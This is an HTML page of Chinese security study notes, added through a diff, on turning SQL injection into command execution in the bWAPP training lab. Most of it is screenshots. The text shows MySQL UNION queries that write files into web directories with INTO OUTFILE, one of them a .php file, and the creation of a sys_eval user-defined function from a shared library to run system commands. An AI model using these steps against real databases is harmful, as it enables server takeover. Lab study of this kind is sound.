@@ -1,0 +1,63 @@
+<h1 id="SQL注入之命令执行"><a href="#SQL注入之命令执行" class="headerlink" title="SQL注入之命令执行"></a>SQL注入之命令执行</h1><p>​<img src="/assets/image-20230929220301-q2rkffq.png" alt="image">​</p>
+<p>​<img src="/assets/image-20230929221850-zp3nc5q.png" alt="image">​</p>
+<p>​<img src="/assets/image-20230929221930-t4ta1ll.png" alt="image">​</p>
+<p>​<img src="/assets/image-20230929222222-2e6kdc4.png" alt="image">​</p>
+<pre><code class="python">mysql&gt; select * from heroes where id = 7;
+Empty set (0.00 sec)
+
+mysql&gt; select * from heroes where id = 7 union select 1,2,3,4;
++----+-------+----------+--------+
+| id | login | password | secret |
++----+-------+----------+--------+
+|  1 | 2     | 3        | 4      |
++----+-------+----------+--------+
+1 row in set (0.00 sec)
+
+mysql&gt; select * from heroes where id = 7 union select 1,2,3,&#39;hello&#39; into outfile &#39;/var/www/html/&#39;;
+ERROR 1086 (HY000): File &#39;/var/www/html/&#39; already exists
+mysql&gt; select * from heroes where id = 7 union select 1,2,3,&#39;hello&#39; into outfile &#39;/var/www/html/abc.txt&#39;;
+ERROR 1 (HY000): Can&#39;t create/write to file &#39;/var/www/html/abc.txt&#39; (Errcode: 13)
+mysql&gt; 
+</code></pre>
+<p>找到有写权限的文件夹。</p>
+<pre><code class="python">mysql&gt; use bWAPP;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+mysql&gt; select * from heroes where id = 7 union select 1,2,3,&#39;hello&#39; into outfile &#39;/var/www/html/images/abc.php&#39;;
+Query OK, 1 row affected (0.00 sec)
+
+mysql&gt; 
+</code></pre>
+<p>‍</p>
+<p>​<img src="/assets/image-20230929223031-0y9r1kb.png" alt="image">​</p>
+<p>​<img src="/assets/image-20230929223018-4ltxznq.png" alt="image"></p>
+<p>​​<img src="/assets/image-20230929223317-hoszwjl.png" alt="image">​</p>
+<p>​<img src="/assets/image-20231004200527-5oew64i.png" alt="image">​</p>
+<p>​<img src="/assets/image-20231004200543-b53cym0.png" alt="image">​</p>
+<p>​<img src="/assets/image-20231004200739-k7afew9.png" alt="image">​</p>
+<p>​<img src="/assets/image-20231004201846-woehgms.png" alt="image"></p>
+<p>剔除回车</p>
+<p>tr -d ‘\n’ &lt; input.txt &gt; output.txt​</p>
+<p>​<img src="/assets/image-20231004202619-mwbcoga.png" alt="image">​</p>
+<p>​<img src="/assets/image-20231004202813-jqg4kd8.png" alt="image">​</p>
+<p>成功写入。</p>
+<p>创建自定义函数。</p>
+<p>​<img src="/assets/image-20231004202940-0u8nkmq.png" alt="image">​</p>
+<pre><code class="python">create function sys_eval returns string soname &quot;lib_linux1.so&quot;;
+</code></pre>
+<p>​<img src="/assets/image-20231004204816-7dyad18.png" alt="image">​</p>
+<p>​<img src="/assets/image-20231004204847-iqrgc5l.png" alt="image">​</p>
+<p>​<img src="/assets/image-20231004204911-vr8djbp.png" alt="image">​</p>
+<p>​<img src="/assets/image-20231004204944-o1zialm.png" alt="image"></p>
+<p>​</p>
+<h2 id="用户和组的概念"><a href="#用户和组的概念" class="headerlink" title="用户和组的概念"></a>用户和组的概念</h2><p>​<img src="/assets/image-20231004230229-9qfa4m0.png" alt="image">​</p>
+<p>​<img src="/assets/image-20231004230309-b61lag4.png" alt="image">​</p>
+<p>​<img src="/assets/image-20231004230400-u38bj2h.png" alt="image"></p>
+<p>​​<img src="/assets/image-20231004230437-96at58h.png" alt="image">​</p>
+<p>​<img src="/assets/image-20231004230522-04vylgc.png" alt="image">​</p>
+<p>​<img src="/assets/image-20231004230558-4ttxdtt.png" alt="image">​</p>
+<p>​<img src="/assets/image-20231004230612-hai1k6e.png" alt="image">​</p>
+<p>​<img src="/assets/image-20231004230646-vmtl41l.png" alt="image">​</p>
+<p>‍</p>
